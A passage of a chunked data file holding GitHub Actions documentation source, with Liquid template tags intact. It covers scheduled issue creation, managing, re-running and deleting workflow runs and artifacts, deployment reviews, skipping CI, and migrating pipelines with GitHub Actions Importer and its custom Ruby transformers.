"               - [ ] Start the recording\n                - [ ] Check-ins\n                - [ ] Discussion points\n                - [ ] Post the recording\n\n                ### Discussion Points\n                Add things to discuss below\n\n                - Work this week\n              PINNED: false\n              CLOSE_PREVIOUS: false\n    ```\n\n1. Customize the parameters in your workflow file:\n   - Change the value for `on.schedule` to dictate when you want this workflow to run. In the example above, the workflow will run every Monday at 7:20 UTC. For more information about scheduled workflows, see \"AUTOTITLE.\"\n   - Change the value for `ASSIGNEES` to the list of {% data variables.product.prodname_dotcom %} usernames that you want to assign to the issue.\n   - Change the value for `LABELS` to the list of labels that you want to apply to the issue.\n   - Change the value for `TITLE` to the title that you want the issue to have.\n   - Change the value for `BODY` to the text that you want in the issue body. The `|` character allows you to use a multi-line value for this parameter.\n   - If you want to pin this issue in your repository, set `PINNED` to `true`. For more information about pinned issues, see \"AUTOTITLE.\"\n   - If you want to close the previous issue generated by this workflow each time a new issue is created, set `CLOSE_PREVIOUS` to `true`. The workflow will close the most recent issue that has the labels defined in the `labels` field. To avoid closing the wrong issue, use a unique label or combination of labels.\n1. {% data reusables.actions.commit-workflow %}\n\n\n\nExpected results\n\nBased on the `schedule` parameter (for example, every Monday at 7:20 UTC), your workflow will create a new issue with the assignees, labels, title, and body that you specified. If you set `PINNED` to `true`, the workflow will pin the issue to your repository. If you set `CLOSE_PREVIOUS` to true, the workflow will close the most recent issue with matching labels.\n\n{% data reusables.actions.schedule-delay %}\n\nYou can view the history o", "Y2h1bmtfMl9pbmRleF8xNDM=": "f your workflow runs to see this workflow run periodically. For more information, see \"AUTOTITLE.\"\n\n\n\nNext steps\n\n- To learn more about additional things you can do with the {% data variables.product.prodname_cli %}, like using an issue template, see the `gh issue create` documentation.\n- Search {% data variables.product.prodname_marketplace %} for actions related to scheduled issues.\n\n", "Y2h1bmtfMF9pbmRleF8xNDQ=": "\n\nWhen do workflows run?\n\nYou can configure your workflows to run on a schedule or be triggered when an event occurs. For example, you can set your workflow to run when someone creates an issue in a repository.\n\nMany workflow triggers are useful for automating project management.\n\n- An issue is opened, assigned, or labeled.\n- A comment is added to an issue.\n- A project card is created or moved.\n- A scheduled time.\n\nFor a full list of events that can trigger workflows, see \"AUTOTITLE.\"\n\n\n\nWhat can workflows do?\n\nWorkflows can do many things, such as commenting on an issue, adding or removing labels, moving cards on project boards, and opening issues.\n\nYou can learn about using {% data variables.product.prodname_actions %} for project management by following these tutorials, which include example workflows that you can adapt to meet your needs.\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8xNDU=": "\n\nAbout workflow runs from private forks\n\n{% data reusables.actions.private-repository-forks-overview %} For more information, see \"AUTOTITLE.\"\n\n\n\nApproving workflow runs on a pull request from a private fork\n\n{% data reusables.actions.workflows.approve-workflow-runs %}\n\n", "Y2h1bmtfMF9pbmRleF8xNDY=": "\n\nAbout workflow runs from public forks\n\n{% data reusables.actions.workflow-run-approve-public-fork %}\n\nYou can configure workflow approval requirements for a repository, organization, or enterprise.\n\nWorkflow runs that have been awaiting approval for more than 30 days are automatically deleted.\n\n\n\nApproving workflow runs on a pull request from a public fork\n\n{% data reusables.actions.workflows.approve-workflow-runs %}\n\n", "Y2h1bmtfMF9pbmRleF8xNDc=": "\n\nCanceling a workflow run\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n1. From the list of workflow runs, click the name of the `queued` or `in progress` run that you want to cancel.\n1. In the upper-right corner of the workflow, click **Cancel workflow**.\n!Screenshot showing the summary for a workflow that is currently running. The \"Cancel workflow\" button is highlighted with a dark orange outline.\n\n\n\nSteps {% data variables.product.prodname_dotcom %} takes to cancel a workflow run\n\nWhen canceling workflow run, you may be running other software that uses resources that are related to the workflow run. To help you free up resources related to the workflow run, it may help to understand the steps {% data variables.product.prodname_dotcom %} performs to cancel a workflow run.\n\n1. To cancel the workflow run, the server re-evaluates `if` conditions for all currently running jobs. If the condition evaluates to `true`, the job will not get canceled. For example, the condition `if: always()` would evaluate to true and the job continues to run. When there is no condition, that is the equivalent of the condition `if: success()`, which only runs if the previous step finished successfully.\n1. For jobs that need to be canceled, the server sends a cancellation message to all the runner machines with jobs that need to be canceled.\n1. For jobs that continue to run, the server re-evaluates `if` conditions for the unfinished steps. If the condition evaluates to `true`, the step continues to run.\n1. For steps that need to be canceled, the runner machine sends `SIGINT/Ctrl-C` to the step's entry process (`node` for javascript action, `docker` for container action, and `bash/cmd/pwd` when using `run` in a step). If the process doesn't exit within 7500 ms, the runner will send `SIGTERM/Ctrl-Break` to the process, then wait for 2500 ms for the process to exit. If the process is still running, the runner kills the process tree.\n1", "Y2h1bmtfMV9pbmRleF8xNDc=": ". After the 5 minutes cancellation timeout period, the server will force terminate all jobs and steps that don't finish running or fail to complete the cancellation process.\n\n", "Y2h1bmtfMF9pbmRleF8xNDg=": "---\ntitle: Deleting a workflow run\nshortTitle: Delete a workflow run\nintro: 'You can delete a workflow run that has been completed, or is more than two weeks old.'\nversions:\n  fpt: '*'\n  ghes: '*'\n  ghae: '*'\n  ghec: '*'\n---\n \n{% data reusables.actions.enterprise-github-hosted-runners %}\n\n{% data reusables.repositories.permissions-statement-write %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n1. To delete a workflow run, select {% octicon \"kebab-horizontal\" aria-label=\"Show options\" %}, then click **Delete workflow run**.\n\n   !Screenshot of a list of workflow runs. To the right of a run, an icon of three horizontal dots is highlighted with an orange outline.\n\n1. Review the confirmation prompt and click **Yes, permanently delete this workflow run**.\n\n", "Y2h1bmtfMF9pbmRleF8xNDk=": "---\ntitle: Downloading workflow artifacts\nintro: You can download archived artifacts before they automatically expire.\npermissions: 'People who are signed into {% data variables.product.product_name %} and have read access to a repository can download workflow artifacts.'\nversions:\n  fpt: '*'\n  ghes: '*'\n  ghae: '*'\n  ghec: '*'\nshortTitle: Download workflow artifacts\n---\n \n{% data reusables.actions.enterprise-github-hosted-runners %}\n\nBy default, {% data variables.product.product_name %} stores build logs and artifacts for 90 days, and you can customize this retention period, depending on the type of repository. For more information, see \"AUTOTITLE.\"\n\n{% data reusables.repositories.permissions-statement-read %}\n\n{% webui %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n{% data reusables.repositories.view-run %}\n1. In the \"Artifacts\" section, click the artifact you want to download.\n\n    !Screenshot of the \"Artifacts\" section of a workflow run. The name of an artifact generated by the run, \"artifact,\" is highlighted with a dark orange outline.\n\n{% endwebui %}\n\n{% cli %}\n\n{% data reusables.cli.cli-learn-more %}\n\n{% data variables.product.prodname_cli %} will download each artifact into separate directories based on the artifact name. If only a single artifact is specified, it will be extracted into the current directory.\n\nTo download all artifacts generated by a workflow run, use the `run download` subcommand. Replace `run-id` with the ID of the run that you want to download artifacts from. If you don't specify a `run-id`, {% data variables.product.prodname_cli %} returns an interactive menu for you to choose a recent run.\n\n```shell\ngh run download RUN_ID\n```\n\nTo download a specific artifact from a run, use the `run download` subcommand. Replace `run-id` with the ID of the run that you want to download artifacts from. Replace `artifact-name` with the name of the artifact that you want to download.\n\n```shell\ngh", "Y2h1bmtfMV9pbmRleF8xNDk=": " run download RUN_ID -n ARTIFACT_NAME\n```\n\nYou can specify more than one artifact.\n\n```shell\ngh run download RUN_ID> -n ARTIFACT_NAME-1 -n ARTIFACT_NAME-2\n```\n\nTo download specific artifacts across all runs in a repository, use the `run download` subcommand.\n\n```shell\ngh run download -n ARTIFACT_NAME-1 ARTIFACT_NAME-2\n```\n\n{% endcli %}\n\n", "Y2h1bmtfMF9pbmRleF8xNTA=": "\n\nAbout re-running workflows and jobs\n\nRe-running a workflow{% ifversion re-run-jobs %} or jobs in a workflow{% endif %} uses the same `GITHUB_SHA` (commit SHA) and `GITHUB_REF` (Git ref) of the original event that triggered the workflow run. {% ifversion actions-stable-actor-ids %}The workflow will use the privileges of the actor who initially triggered the workflow, not the privileges of the actor who initiated the re-run. {% endif %}You can re-run a workflow{% ifversion re-run-jobs %} or jobs in a workflow{% endif %} for up to 30 days after the initial run.{% ifversion not ghae %}{% ifversion re-run-jobs %} You cannot re-run jobs in a workflow once its logs have passed their retention limits. For more information, see \"AUTOTITLE.\"{% endif %}{% endif %}{% ifversion debug-reruns %} When you re-run a workflow or jobs in a workflow, you can enable debug logging for the re-run. This will enable runner diagnostic logging and step debug logging for the re-run. For more information about debug logging, see \"AUTOTITLE.\"{% endif %}\n\n\n\nRe-running all the jobs in a workflow\n\n{% webui %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n{% data reusables.repositories.view-run %}\n1. In the upper-right corner of the workflow, re-run jobs.\n\n   - If any jobs failed, select the **{% octicon \"sync\" aria-hidden=\"true\" %} Re-run jobs** dropdown menu and click **Re-run all jobs**.\n\n   - If no jobs failed, click **Re-run all jobs**.\n{% ifversion ghae -%}\n1. In the upper-right corner of the workflow, select the **Re-run jobs** dropdown menu and click **Re-run all jobs**.\n{%- endif %}\n{% data reusables.actions.enable-debug-logging %}\n\n{% endwebui %}\n\n{% cli %}\n\n{% data reusables.cli.cli-learn-more %}\n\nTo re-run a failed workflow run, use the `run rerun` subcommand. Replace `run-id` with the ID of the failed run that you want to re-run.  If you don't specify a `run-id`, {% data variables.product.prodname_cli %} returns an interactive ", "Y2h1bmtfMV9pbmRleF8xNTA=": "menu for you to choose a recent failed run.\n\n```shell\ngh run rerun RUN_ID\n```\n\n{% ifversion debug-reruns %}\n{% data reusables.actions.enable-debug-logging-cli %}\n\n```shell\ngh run rerun RUN_ID --debug\n```\n\n{% endif %}\n\nTo view the progress of the workflow run, use the `run watch` subcommand and select the run from the interactive list.\n\n```shell\ngh run watch\n```\n\n{% endcli %}\n\n{% ifversion re-run-jobs %}\n\n\n\nRe-running failed jobs in a workflow\n\nIf any jobs in a workflow run failed, you can re-run just the jobs that failed. When you re-run failed jobs in a workflow, a new workflow run will start for all failed jobs and their dependents. Any outputs for any successful jobs in the previous workflow run will be used for the re-run. Any artifacts that were created in the initial run will be available in the re-run. Any deployment protection rules that passed in the previous run will automatically pass in the re-run.\n\n{% webui %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n{% data reusables.repositories.view-run %}\n1. In the upper-right corner of the workflow, select the **{% octicon \"sync\" aria-hidden=\"true\" %} Re-run jobs** dropdown menu, and click **Re-run failed jobs**.\n{% data reusables.actions.enable-debug-logging %}\n\n{% endwebui %}\n\n{% cli %}\n\nTo re-run failed jobs in a workflow run, use the `run rerun` subcommand with the `--failed` flag. Replace `run-id` with the ID of the run for which you want to re-run failed jobs. If you don't specify a `run-id`, {% data variables.product.prodname_cli %} returns an interactive menu for you to choose a recent failed run.\n\n```shell\ngh run rerun RUN_ID --failed\n```\n\n{% ifversion debug-reruns %}\n{% data reusables.actions.enable-debug-logging-cli %}\n\n```shell\ngh run rerun RUN_ID --failed --debug\n```\n\n{% endif %}\n{% endcli %}\n\n\n\nRe-running a specific job in a workflow\n\nWhen you re-run a specific job in a workflow, a new workflow run will start for the job and any dependent", "Y2h1bmtfMl9pbmRleF8xNTA=": "s. Any outputs for any other jobs in the previous workflow run will be used for the re-run. Any artifacts that were created in the initial run will be available in the re-run. Any deployment protection rules that passed in the previous run will automatically pass in the re-run.\n\n{% webui %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n{% data reusables.repositories.view-run %}\n1. Next to the job that you want to re-run, click {% octicon \"sync\" aria-label=\"The re-run icon\" %}.\n\n   !Screenshot of the page for a workflow run. In the left sidebar, to the right of a job, a sync icon is outlined in dark orange.\n{% data reusables.actions.enable-debug-logging %}\n\n{% endwebui %}\n\n{% cli %}\n\nTo re-run a specific job in a workflow run, use the `run rerun` subcommand with the `--job` flag. Replace `job-id` with the ID of the job that you want to re-run.\n\n```shell\ngh run rerun --job JOB_ID\n```\n\n{% ifversion debug-reruns %}\n{% data reusables.actions.enable-debug-logging-cli %}\n\n```shell\ngh run rerun --job JOB_ID --debug\n```\n\n{% endif %}\n{% endcli %}\n\n{% endif %}\n\n{% ifversion partial-reruns-with-reusable %}\n\n\n\nRe-running workflows and jobs with reusable workflows\n\n{% data reusables.actions.partial-reruns-with-reusable %}\n\n{% endif %}\n\n\n\nReviewing previous workflow runs\n\nYou can view the results from your previous attempts at running a workflow. You can also view previous workflow runs using the API. For more information, see \"AUTOTITLE.\"\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n{% data reusables.repositories.view-run %}\n{%- ifversion re-run-jobs %}\n1. To the right of the run name, select the **Latest** dropdown menu and click a previous run attempt.\n\n   !Screenshot of the page for a workflow run. A dropdown menu, labeled \"Latest #2,\" is outlined in dark orange.\n{%- else %}\n1. In the left pane, click a previous ", "Y2h1bmtfM19pbmRleF8xNTA=": "run attempt.\n{%- endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xNTE=": "\n\nDeleting an artifact\n\n{% warning %}\n\n**Warning:** Once you delete an artifact, it cannot be restored.\n\n{% endwarning %}\n\n{% data reusables.repositories.permissions-statement-write %}\n\n{% data reusables.actions.artifact-log-retention-statement %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n{% data reusables.repositories.view-run %}\n1. Under **Artifacts**, click {% octicon \"trash\" aria-label=\"Remove artifact ARTIFACT-NAME\" %} next to the artifact you want to remove.\n\n    !Screenshot showing artifacts created during a workflow run. A trash can icon, used to remove an artifact, is outlined in dark orange.\n\n\n\nSetting the retention period for an artifact\n\nRetention periods for artifacts and logs can be configured at the repository, organization, and enterprise level. For more information, see {% ifversion fpt or ghec or ghes %}\"AUTOTITLE.\"{% elsif ghae %}\"AUTOTITLE,\" \"AUTOTITLE,\" or \"AUTOTITLE.\"{% endif %}\n\nYou can also define a custom retention period for individual artifacts using the `actions/upload-artifact` action in a workflow. For more information, see \"AUTOTITLE.\"\n\n\n\nFinding the expiration date of an artifact\n\nYou can use the API to confirm the date that an artifact is scheduled to be deleted. For more information, see the `expires_at` value returned by \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xNTI=": "\n\nAbout required reviews in workflows\n\nJobs that reference an environment configured with required reviewers will wait for an approval before starting. While a job is awaiting approval, it has a status of \"Waiting\". If a job is not approved within 30 days, it will automatically fail.\n\nFor more information about environments and required approvals, see \"AUTOTITLE.\" For information about how to review deployments with the REST API, see \"AUTOTITLE.\"\n\n\n\nApproving or rejecting a job\n\n1. Navigate to the workflow run that requires review. For more information about navigating to a workflow run, see \"AUTOTITLE.\"\n1. If the run requires review, you will see a notification for the review request. On the notification, click **Review deployments**.\n1. Select the job environment(s) to approve or reject. Optionally, leave a comment.\n1. Approve or reject:\n   - To approve the job, click **Approve and deploy**. Once a job is approved (and any other deployment protection rules have passed), the job will proceed. At this point, the job can access any secrets stored in the environment.\n   - To reject the job, click **Reject**. If a job is rejected, the workflow will fail.\n\n{% ifversion deployments-prevent-self-approval %}{% note %}\n\n**Note:** If the targeted environment is configured to prevent self-approvals for deployments, you will not be able to approve a deployment from a workflow run you initiated. For more information, see \"AUTOTITLE.\"\n\n{% endnote %}{% endif %}\n\n{% ifversion actions-break-glass %}\n\n\n\nBypassing deployment protection rules\n\nIf you have configured deployment protection rules that control whether software can be deployed to an environment, you can bypass these rules and force all pending jobs referencing the environment to proceed.\n\n{% note %}\n\n**Notes:**\n\n- You cannot bypass deployment protection rules if the environment has been configured to prevent admins from bypassing configured protection rules. For more information, see \"AUTOTITLE.\"\n- You can only bypass deployment protection rules during workflow executio", "Y2h1bmtfMV9pbmRleF8xNTI=": "n when a job referencing the environment is in a \"Pending\" state.\n\n{% endnote %}\n\n1. Navigate to the workflow run. For more information about navigating to a workflow run, see \"AUTOTITLE.\"\n1. To the right of **Deployment protection rules**, click **Start all waiting jobs**.\n   !Screenshot of the \"Deployment protection rules\" section with the \"Start all waiting jobs\" button outlined in orange.\n1. In the pop-up window, select the environments for which you want to bypass deployment protection rules.\n1. Under **Leave a comment**, enter a description for bypassing the deployment protection rules.\n1. Click **I understand the consequences, start deploying**.\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xNTM=": "---\ntitle: Skipping workflow runs\nintro: You can skip workflow runs triggered by the `push` and `pull_request` events by including a command in your commit message.\nversions:\n  fpt: '*'\n  ghes: '*'\n  ghae: '*'\n  ghec: '*'\nshortTitle: Skip workflow runs\n---\n \n{% data reusables.actions.enterprise-github-hosted-runners %}\n\n{% note %}\n\n**Note:** If a workflow is skipped due to path filtering, branch filtering or a commit message (see below), then checks associated with that workflow will remain in a \"Pending\" state. A pull request that requires those checks to be successful will be blocked from merging.\n\n{% endnote %}\n\nWorkflows that would otherwise be triggered using `on: push` or `on: pull_request` won't be triggered if you add any of the following strings to the commit message in a push, or the HEAD commit of a pull request:\n\n- `[skip ci]`\n- `[ci skip]`\n- `[no ci]`\n- `[skip actions]`\n- `[actions skip]`\n\nAlternatively, you can add a `skip-checks` trailer to your commit message. The trailers section should be included at the end of your commit message and be proceeded by two empty lines. If you already have other trailers in your commit message, `skip-checks` should be last. You can use either of the following:\n- `skip-checks:true`\n- `skip-checks: true`\n\n{% data reusables.commits.about-commit-cleanup %}\n\nYou won't be able to merge the pull request if your repository is configured to require specific checks to pass first. To allow the pull request to be merged you can push a new commit to the pull request without the skip instruction in the commit message.\n\n{% note %}\n\n**Note:** Skip instructions only apply to the `push` and `pull_request` events. For example, adding `[skip ci]` to a commit message won't stop a workflow that's triggered `on: pull_request_target` from running.\n\n{% endnote %}\n\nSkip instructions only apply to the workflow run(s) that would be triggered by the commit that contains the skip instructions. You can also disable a workflow from running. For more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xNTQ=": "\n\nAbout {% data variables.product.prodname_actions_importer %}\n\nYou can use {% data variables.product.prodname_actions_importer %} to plan and automatically migrate your CI/CD supported pipelines to {% data variables.product.prodname_actions %}.\n\n{% data variables.product.prodname_actions_importer %} is distributed as a Docker container, and uses a {% data variables.product.prodname_dotcom %} CLI extension to interact with the container.\n\nAny workflow that is converted by the {% data variables.product.prodname_actions_importer %} should be inspected for correctness before using it as a production workload. The goal is to achieve an 80% conversion rate for every workflow, however, the actual conversion rate will depend on the makeup of each individual pipeline that is converted.\n\n\n\nSupported CI platforms\n\nYou can use {% data variables.product.prodname_actions_importer %} to migrate from the following platforms:\n\n- Azure DevOps\n- Bamboo\n- Bitbucket Pipelines\n- CircleCI\n- GitLab\n- Jenkins\n- Travis CI\n\n\n\nPrerequisites\n\n{% data variables.product.prodname_actions_importer %} has the following requirements:\n\n{% data reusables.actions.actions-importer-prerequisites %}\n\n\n\nInstalling the {% data variables.product.prodname_actions_importer %} CLI extension\n\n{% data reusables.actions.installing-actions-importer %}\n\n\n\nUpdating the {% data variables.product.prodname_actions_importer %} CLI\n\nTo ensure you're running the latest version of {% data variables.product.prodname_actions_importer %}, you should regularly run the `update` command:\n\n```bash\ngh actions-importer update\n```\n\n\n\nAuthenticating at the command line\n\nYou must configure credentials that allow {% data variables.product.prodname_actions_importer %} to communicate with {% data variables.product.prodname_dotcom %} and your current CI server. You can configure these credentials using environment variables or a `.env.local` file. The environment variables can be configured in an interactive prompt, by running the following command:\n\n```bash\ngh actions-importer configur", "Y2h1bmtfMV9pbmRleF8xNTQ=": "e\n```\n\n\n\nUsing the {% data variables.product.prodname_actions_importer %} CLI\n\nUse the subcommands of `gh actions-importer` to begin your migration to {% data variables.product.prodname_actions %}, including `audit`, `forecast`, `dry-run`, and `migrate`.\n\n\n\nAuditing your existing CI pipelines\n\nThe `audit` subcommand can be used to plan your CI/CD migration by analyzing your current CI/CD footprint. This analysis can be used to plan a timeline for migrating to {% data variables.product.prodname_actions %}.\n\nTo run an audit, use the following command to determine your available options:\n\n```bash\n$ gh actions-importer audit -h\nDescription:\n  Plan your CI/CD migration by analyzing your current CI/CD footprint.\n\n[...]\n\nCommands:\n  azure-devops  An audit will output a list of data used in an Azure DevOps instance.\n  bamboo        An audit will output a list of data used in a Bamboo instance.\n  circle-ci     An audit will output a list of data used in a CircleCI instance.\n  gitlab        An audit will output a list of data used in a GitLab instance.\n  jenkins       An audit will output a list of data used in a Jenkins instance.\n  travis-ci     An audit will output a list of data used in a Travis CI instance.\n```\n\n\n\nForecasting usage\n\nThe `forecast` subcommand reviews historical pipeline usage to create a forecast of {% data variables.product.prodname_actions %} usage.\n\nTo run a forecast, use the following command to determine your available options:\n\n```bash\n$ gh actions-importer forecast -h\nDescription:\n  Forecasts GitHub Actions usage from historical pipeline utilization.\n\n[...]\n\nCommands:\n  azure-devops  Forecasts GitHub Actions usage from historical Azure DevOps pipeline utilization.\n  bamboo        Forecasts GitHub Actions usage from historical Bamboo pipeline utilization.\n  jenkins       Forecasts GitHub Actions usage from historical Jenkins pipeline utilization.\n  gitlab        Forecasts GitHub Actions usage from historical GitLab pipeline utilization.\n  circle-ci     Forecasts GitHub Actions usage from historica", "Y2h1bmtfMl9pbmRleF8xNTQ=": "l CircleCI pipeline utilization.\n  travis-ci     Forecasts GitHub Actions usage from historical Travis CI pipeline utilization.\n  github        Forecasts GitHub Actions usage from historical GitHub pipeline utilization.\n```\n\n\n\nTesting the migration process\n\nThe `dry-run` subcommand can be used to convert a pipeline to its {% data variables.product.prodname_actions %} equivalent, and then write the workflow to your local filesystem.\n\nTo perform a dry run, use the following command to determine your available options:\n\n```bash\n$ gh actions-importer dry-run -h\nDescription:\n  Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n\n[...]\n\nCommands:\n  azure-devops  Convert an Azure DevOps pipeline to a GitHub Actions workflow and output its yaml file.\n  bamboo        Convert a Bamboo pipeline to GitHub Actions workflows and output its yaml file.\n  circle-ci     Convert a CircleCI pipeline to GitHub Actions workflows and output the yaml file(s).\n  gitlab        Convert a GitLab pipeline to a GitHub Actions workflow and output the yaml file.\n  jenkins       Convert a Jenkins job to a GitHub Actions workflow and output its yaml file.\n  travis-ci     Convert a Travis CI pipeline to a GitHub Actions workflow and output its yaml file.\n```\n\n\n\nMigrating a pipeline to {% data variables.product.prodname_actions %}\n\nThe `migrate` subcommand can be used to convert a pipeline to its GitHub Actions equivalent and then create a pull request with the contents.\n\nTo run a migration, use the following command to determine your available options:\n\n```bash\n$ gh actions-importer migrate -h\nDescription:\n  Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes.\n\n[...]\n\nCommands:\n  azure-devops  Convert an Azure DevOps pipeline to a GitHub Actions workflow and open a pull request with the changes.\n  bamboo        Convert a Bamboo pipeline to GitHub Actions workflows and open a pull request with the changes.\n  circle-ci     Convert a CircleCI pipeline to GitHub Actions workflows and open a pu", "Y2h1bmtfM19pbmRleF8xNTQ=": "ll request with the changes.\n  gitlab        Convert a GitLab pipeline to a GitHub Actions workflow and open a pull request with the changes.\n  jenkins       Convert a Jenkins job to a GitHub Actions workflow and open a pull request with the changes.\n  travis-ci     Convert a Travis CI pipeline to a GitHub Actions workflow and and open a pull request with the changes.\n```\n\n\n\nPerforming self-serve migrations using IssueOps\n\nYou can use {% data variables.product.prodname_actions %} and {% data variables.product.prodname_github_issues %} to run CLI commands for {% data variables.product.prodname_actions_importer %}. This allows you to migrate your CI/CD workflows without installing software on your local machine. This approach is especially useful for organizations that want to enable self-service migrations to {% data variables.product.prodname_actions %}. Once IssueOps is configured, users can open an issue with the relevant template to migrate pipelines to {% data variables.product.prodname_actions %}.\n\nFor more information about setting up self-serve migrations with IssueOps, see the `actions/importer-issue-ops` template repository.\n\n\n\nUsing the {% data variables.product.prodname_actions_importer %} labs repository\n\nThe {% data variables.product.prodname_actions_importer %} labs repository contains platform-specific learning paths that teach you how to use {% data variables.product.prodname_actions_importer %} and how to approach migrations to {% data variables.product.prodname_actions %}. You can use this repository to learn how to use {% data variables.product.prodname_actions_importer %} to help plan, forecast, and automate your migration to {% data variables.product.prodname_actions %}.\n\nTo learn more, see the GitHub Actions Importer labs repository.\n\n\n\nLegal notice\n\n{% data reusables.actions.actions-importer-legal-notice %}\n\n", "Y2h1bmtfMF9pbmRleF8xNTU=": "\n\nAbout custom transformers\n\n{% data variables.product.prodname_actions_importer %} offers the ability to extend its built-in mapping by creating custom transformers. Custom transformers can be used to:\n\n- Convert items that {% data variables.product.prodname_actions_importer %} does not automatically convert, or modify how items are converted. For more information, see \"Creating custom transformers for items.\"\n- Convert references to runners to use different runner labels. For more information, see \"Creating custom transformers for runners.\"\n- Convert environment variable values from your existing pipelines to {% data variables.product.prodname_actions %} workflows. For more information, see \"Creating custom transformers for environment variables.\"\n\n\n\nUsing custom transformers with {% data variables.product.prodname_actions_importer %}\n\nA custom transformer contains mapping logic that {% data variables.product.prodname_actions_importer %} can use to transform your plugins, tasks, runner labels, or environment variables to work with {% data variables.product.prodname_actions %}. Custom transformers are written with a domain-specific language (DSL) built on top of Ruby, and are defined within a file with the `.rb` file extension.\n\nYou can use the `--custom-transformers` CLI option to specify which custom transformer files to use with the `audit`, `dry-run`, and `migrate` commands.\n\nFor example, if custom transformers are defined in a file named `transformers.rb`, you can use the following command to use them with {% data variables.product.prodname_actions_importer %}:\n\n```shell\ngh actions-importer ... --custom-transformers transformers.rb\n```\n\nAlternatively, you can use the glob pattern syntax to specify multiple custom transformer files. For example, if multiple custom transformer files are within a directory named `transformers`, you can provide them all to {% data variables.product.prodname_actions_importer %} with the following command:\n\n```shell\ngh actions-importer ... --custom-transformers transformers/*.rb\n", "Y2h1bmtfMV9pbmRleF8xNTU=": "```\n\n{% note %}\n\n**Note:** When you use custom transformers, the custom transformer files must reside in the same directory, or in subdirectores, from where the `gh actions-importer` command is run.\n\n{% endnote %}\n\n\n\nCreating custom transformers for items\n\nYou can create custom transformers that {% data variables.product.prodname_actions_importer %} will use when converting existing build steps or triggers to their equivalent in {% data variables.product.prodname_actions %}. This is especially useful when:\n\n- {% data variables.product.prodname_actions_importer %} doesn't automatically convert an item.\n- You want to change how an item is converted by {% data variables.product.prodname_actions_importer %}.\n- Your existing pipelines use custom or proprietary extensions, such as shared libraries in Jenkins, and you need to define how these steps should function in {% data variables.product.prodname_actions %}.\n\n{% data variables.product.prodname_actions_importer %} uses custom transformers that are defined using a DSL built on top of Ruby. In order to create custom transformers for build steps and triggers:\n\n- Each custom transformer file must contain at least one `transform` method.\n- Each `transform` method must return a `Hash`, an array of `Hash`'s, or `nil`. This returned value will correspond to an action defined in YAML. For more information about actions, see \"AUTOTITLE.\"\n\n\n\nExample custom transformer for a build step\n\nThe following example converts a build step that uses the \"buildJavascriptApp\" identifier to run various `npm` commands:\n\n```ruby copy\ntransform \"buildJavascriptApp\" do |item|\n  command = [\"build\", \"package\", \"deploy\"].map do |script|\n    \"npm run #{script}\"\n  end\n\n  {\n    name: \"build javascript app\",\n    run: command.join(\"\\n\")\n  }\nend\n```\n\nThe above example results in the following {% data variables.product.prodname_actions %} workflow step. It is comprised of converted build steps that had a `buildJavascriptApp` identifier:\n\n```yaml\n- name: build javascript app\n  run: |\n    npm run build\n   ", "Y2h1bmtfMl9pbmRleF8xNTU=": " npm run package\n    npm run deploy\n```\n\nThe `transform` method uses the identifier of the build step from your source CI/CD instance in an argument. In this example, the identifier is `buildJavascriptLibrary`. You can also use comma-separated values to pass multiple identifiers to the `transform` method. For example, `transform \"buildJavascriptApp\", \"buildTypescriptApp\" { |item| ... }`.\n\n{% note %}\n\n**Note**: The data structure of `item` will be different depending on the CI/CD platform and the type of item being converted.\n\n{% endnote %}\n\n\n\nCreating custom transformers for runners\n\nYou can customize the mapping between runners in your source CI/CD instance and their equivalent {% data variables.product.prodname_actions %} runners.\n\n{% data variables.product.prodname_actions_importer %} uses custom transformers that are defined using a DSL built on top of Ruby. To create custom transformers for runners:\n\n- The custom transformer file must have at least one `runner` method.\n- The `runner` method accepts two parameters. The first parameter is the source CI/CD instance's runner label, and the second parameter is the corresponding {% data variables.product.prodname_actions %} runner label. {% ifversion not ghae %}For more information on {% data variables.product.prodname_actions %} runners, see \"AUTOTITLE.\"{% endif %}\n\n\n\nExample custom transformers for runners\n\nThe following example shows a `runner` method that converts one runner label to one {% data variables.product.prodname_actions %} runner label in the resulting workflow.\n\n```ruby copy\nrunner \"linux\", \"ubuntu-latest\"\n```\n\nYou can also use the `runner` method to convert one runner label to multiple {% data variables.product.prodname_actions %} runner labels in the resulting workflow.\n\n```ruby copy\nrunner \"big-agent\", [\"self-hosted\", \"xl\", \"linux\"]\n```\n\n{% data variables.product.prodname_actions_importer %} attempts to map the runner label as best it can. In cases where it cannot do this, the `ubuntu-latest` runner label is used as a default. You can use a speci", "Y2h1bmtfM19pbmRleF8xNTU=": "al keyword with the `runner` method to control this default value. For example, the following custom transformer instructs {% data variables.product.prodname_actions_importer %} to use `macos-latest` as the default runner instead of `ubuntu-latest`.\n\n```ruby copy\nrunner :default, \"macos-latest\"\n```\n\n\n\nCreating custom transformers for environment variables\n\nYou can customize the mapping between environment variables in your source CI/CD pipelines to their values in {% data variables.product.prodname_actions %}.\n\n{% data variables.product.prodname_actions_importer %} uses custom transformers that are defined using a DSL built on top of Ruby. To create custom transformers for environment variables:\n\n- The custom transformer file must have at least one `env` 